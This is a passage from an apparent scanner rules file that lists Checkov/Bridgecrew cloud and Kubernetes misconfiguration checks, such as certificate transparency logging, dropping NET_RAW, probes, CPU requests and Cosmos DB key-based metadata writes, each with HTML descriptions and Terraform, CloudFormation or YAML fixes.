</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_26' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_26</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_26' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_97</key>
    <name>Ensure GCP Memorystore for Redis uses intransit encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-memorystore-for-redis-does-not-use-intransit-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-memorystore-for-redis-does-not-use-intransit-encryption"></div>GCP Memorystore for Redis does not use intransit encryption</div><a aria-label="Skip link to GCP Memorystore for Redis does not use intransit encryption" class="heading-anchor-icon fa fa-anchor" href="#gcp-memorystore-for-redis-does-not-use-intransit-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-memorystore-for-redis-uses-intransit-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-memorystore-for-redis-uses-intransit-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-memorystore-for-redis-uses-intransit-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_74</key>
    <name>Ensure GCP subnet has a private IP Google access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-subnet-does-not-have-a-private-ip-google-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-subnet-does-not-have-a-private-ip-google-access"></div>GCP subnet does not have a private IP Google access</div><a aria-label="Skip link to GCP subnet does not have a private IP Google access" class="heading-anchor-icon fa fa-anchor" href="#gcp-subnet-does-not-have-a-private-ip-google-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-subnet-has-a-private-ip-google-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-subnet-has-a-private-ip-google-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-subnet-has-a-private-ip-google-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_234</key>
    <name>Ensure AWS ACM certificates has logging preference</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-acm-certificate-does-not-have-logging-preference"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-acm-certificate-does-not-have-logging-preference"></div>AWS ACM certificate does not have logging preference</div><a aria-label="Skip link to AWS ACM certificate does not have logging preference" class="heading-anchor-icon fa fa-anchor" href="#aws-acm-certificate-does-not-have-logging-preference"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>To guard against SSL/TLS certificates that are issued by mistake or by a compromised CA, some browsers like Chrome require that public certificates issued for a domain be recorded in a certificate transparency log. The domain name is recorded, but not the private key. Certificates that are not logged typically generate an error in the browser.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-console"></div>Console</div><a aria-label="Skip link to Console" class="heading-anchor-icon fa fa-anchor" href="#console"></a></h2>
<p>It is not possible to adjust transparency logging via console.</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli"></div>CLI</div><a aria-label="Skip link to CLI" class="heading-anchor-icon fa fa-anchor" href="#cli"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws acm request-certificate \
--domain-name example.com \
--validation-method DNS \
--options CertificateTransparencyLoggingPreference=ENABLED \
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources: 
  Example: 
    Type: "AWS::CertificateManager::Certificate"
    Properties: 
      DomainName: example.com
      ValidationMethod: DNS
+     CertificateTransparencyLoggingPreference: ENABLED
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_acm_certificate" "example" {
  domain_name       = "example.com"
  validation_method = "DNS"

+ options {
+   certificate_transparency_logging_preference = "ENABLED"
+ }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-acm-certificates-has-logging-preference' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-acm-certificates-has-logging-preference</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-acm-certificates-has-logging-preference' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_87</key>
    <name>Ensure GCP data fusion instances are private</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-data-fusion-instances-are-not-private"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-data-fusion-instances-are-not-private"></div>GCP data fusion instances are not private</div><a aria-label="Skip link to GCP data fusion instances are not private" class="heading-anchor-icon fa fa-anchor" href="#gcp-data-fusion-instances-are-not-private"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-data-fusion-instances-are-private' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-data-fusion-instances-are-private</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-data-fusion-instances-are-private' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITLABCI_3</key>
    <name>Image with no violations</name>
    <description>
      <![CDATA[<p>The image was identified in a scan but does not contain any vulnerabilities.</p> <br/> <a href='https://docs.bridgecrew.io/docs/image-with-no-violations' target='_blank'> https://docs.bridgecrew.io/docs/image-with-no-violations</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/image-with-no-violations' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_7</key>
    <name>Do not admit containers with NET_RAW capability</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="containers-with-net_raw-capability-admitted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-containers-with-net-raw-capability-admitted"></div>Containers with NET_RAW capability admitted</div><a aria-label="Skip link to Containers with NET_RAW capability admitted" class="heading-anchor-icon fa fa-anchor" href="#containers-with-net_raw-capability-admitted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>NET_RAW is a default permissive setting in Kubernetes allowing ICMP traffic between containers and  grants an application the ability to craft raw packets.</p>
<p>In the hands of an attacker NET_RAW can enable a wide variety of networking exploits from within the cluster.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: PodSecurityPolicy</li>
<li><strong>Argument</strong>: requiredDropCapabilities (Optional)<br/>
Defines the capabilities which must be dropped from containers. These capabilities are removed from the default set, and must not be added. NET_RAW capability is removed when the field includes it specifically, or when it includes <strong>ALL</strong>.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: &lt;policy name&gt;
spec:
  requiredDropCapabilities: 
+   -ALL
or
+ -NET_RAW
</code></pre></div></div>
<p>To use a <strong>PodSecurityPolicy</strong> resource, the requesting user or target pod&#8217;s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use <strong>RBAC</strong>, a standard Kubernetes authorization mode.</p>
<p>First, a <strong>Role</strong> or <strong>ClusterRole</strong> needs to grant access to <strong>use</strong> the desired policies. </p>
<p><strong>Kind</strong>: ClusterRole</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: &lt;role name&gt;
rules:
- apiGroups: ['policy']
  resources: ['podsecuritypolicies']
  verbs:     ['use']
  resourceNames:
  - &lt;policy name&gt;
</code></pre></div></div>
<p>The <strong>ClusterRole</strong> is then bound to the authorized service(s):</p>
<p><strong>Kind</strong>: ClusterRoleBinding</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: &lt;binding name&gt;
roleRef:
  kind: ClusterRole
  name: &lt;role name&gt;
  apiGroup: rbac.authorization.k8s.io
subjects:
- kind: ServiceAccount
  name: &lt;authorized service account name&gt;
  namespace: &lt;authorized pod namespace&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_6' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_6</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_6' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_8</key>
    <name>Ensure liveness probe is configured</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="liveness-probe-is-not-configured"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-liveness-probe-is-not-configured"></div>Liveness probe is not configured</div><a aria-label="Skip link to Liveness probe is not configured" class="heading-anchor-icon fa fa-anchor" href="#liveness-probe-is-not-configured"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The kubelet uses liveness probes to know when to schedule restarts for containers. Restarting a container in a deadlock state can help to make the application more available, despite bugs. </p>
<p>If a container is unresponsive, either to a deadlocked application or a multi-threading defect, restarting the container can make the application more available, despite the defect.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Field</strong>: livenessProbe (Optional)<br/>
The probe describes a health check to be performed against a container to determine whether it is alive or not.<br/>
Its arguments may include: exec, failureThreshold, httpGet, initialDelaySeconds, periodSeconds, successThreshold, tcpSocket and timeoutSeconds.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
+   livenessProbe:
      &lt;Probe arguments&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_7' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_7</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_7' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_9</key>
    <name>Ensure readiness probe is configured</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="readiness-probe-is-not-configured"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-readiness-probe-is-not-configured"></div>Readiness probe is not configured</div><a aria-label="Skip link to Readiness probe is not configured" class="heading-anchor-icon fa fa-anchor" href="#readiness-probe-is-not-configured"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Readiness Probe is a Kubernetes capability that enables teams to make their applications more reliable and robust. This probe regulates under what circumstances the pod should be taken out of the list of service endpoints so that it no longer responds to requests. In defined circumstances the probe can remove the pod from the list of available service endpoints.</p>
<p>Using the Readiness Probe ensures teams define what actions need to be taken to prevent failure and ensure recovery in case of unexpected errors.</p>
<p><a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/" target="_self" title="Configure Liveness, Readiness and Startup Probes">Kubernetes.io Documentation</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<p><strong>Resource</strong>: Container<br/>
<strong>Field</strong>: readinessProbe (Optional)<br/>
The probe describes a health check to be performed against a container to determine whether it is ready for traffic or not.<br/>
Its configurations may include: exec, failureThreshold, httpGet, initialDelaySeconds, periodSeconds, successThreshold, tcpSocket and timeoutSeconds.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
+   readinessProbe:
      &lt;Probe configurations&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_8' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_8</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_8' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_10</key>
    <name>Ensure CPU request is set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cpu-request-is-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cpu-request-is-not-set"></div>CPU request is not set</div><a aria-label="Skip link to CPU request is not set" class="heading-anchor-icon fa fa-anchor" href="#cpu-request-is-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When specifying the resource request for containers in a pod, the scheduler uses this information to decide which node to place the pod on. When setting resource limit for a container, the kubelet enforces those limits so that the running container is not allowed to use more of that resource than the limit you set.</p>
<p>If a container is created in a namespace that has a default CPU limit, and the container does not specify its own CPU limit, then the container is assigned the default CPU limit. Kubernetes assigns a default CPU request under certain conditions.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Argument</strong>: resources:requests:cpu (Optional)<br/>
Defines the CPU request size for the container.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    resources:
      requests:
+       cpu: &lt;cpu request&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_9' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_9</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_9' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_132</key>
    <name>Ensure Cosmos DB does not allow privileged escalation by restricting management plane changes</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cosmosdb-account-enables-privileged-escalation-by-not-restricting-management-plane-changes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cosmos-db-account-enables-privileged-escalation-by-not-restricting-management-plane-changes"></div>CosmosDB account enables privileged escalation by not restricting management plane changes</div><a aria-label="Skip link to CosmosDB account enables privileged escalation by not restricting management plane changes" class="heading-anchor-icon fa fa-anchor" href="#cosmosdb-account-enables-privileged-escalation-by-not-restricting-management-plane-changes"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In 2019, Microsoft added a feature called Jupyter Notebook to Cosmos DB that lets customers visualize their data and create customized views. The feature was automatically turned on for all Cosmos DBs in February 2021. A series of misconfigurations in the notebook feature opened up a new attack vector - the notebook container allowed for a privilege escalation into other customer notebooks. As a result, an attacker could gain access to customers&#8217; Cosmos DB primary keys and other highly sensitive secrets such as the notebook blob storage access token.<br/>
For more details visit - <a href="https://msrc-blog.microsoft.com/2021/08/27/update-on-vulnerability-in-the-azure-cosmos-db-jupyter-notebook-feature/" target="_self">https://msrc-blog.microsoft.com/2021/08/27/update-on-vulnerability-in-the-azure-cosmos-db-jupyter-notebook-feature/</a></p>
<p>One way to reduce risk is to prevent management plane changes for clients using key based authentication. CosmosDB access keys are mainly used by applications to access data in CosmosDB containers. It is rare for organizations to have use cases where the keys are used to make management changes. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_cosmosdb_account</li>
<li><strong>Argument</strong>:  access_key_metadata_writes_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cosmosdb_account" "db" {
  name                = "db"
  ...
+ access_key_metadata_writes_enabled = false
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arm-templates"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arm-templates"></div>ARM Templates</div><a aria-label="Skip link to ARM Templates" class="heading-anchor-icon fa fa-anchor" href="#arm-templates"></a></h2>
<ul>
<li><strong>Resource</strong>: encryptionOperation</li>
<li><strong>Argument</strong>: EnableEncryption</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">{
  "$schema": "https://schema.management.azure.com/schemas/2018-05-01/subscriptionDeploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
    ...
  "resources": [
    {
      "type": "Microsoft.DocumentDB/databaseAccounts",
      "apiVersion": "2018-07-01",
      "name": "db",
      "properties": {
        ...
+       "disableKeyBasedMetadataWriteAccess": true,
      }
    }
  ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_storage_4' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_storage_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_storage_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_152</key>
    <name>Prevent NGINX Ingress annotation snippets which contain LUA code execution</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="nginx-ingress-annotation-snippets-contain-lua-code-execution"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-nginx-ingress-annotation-snippets-contain-lua-code-execution"></div>NGINX Ingress annotation snippets contain LUA code execution</div><a aria-label="Skip link to NGINX Ingress annotation snippets contain LUA code execution" class="heading-anchor-icon fa fa-anchor" href="#nginx-ingress-annotation-snippets-contain-lua-code-execution"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
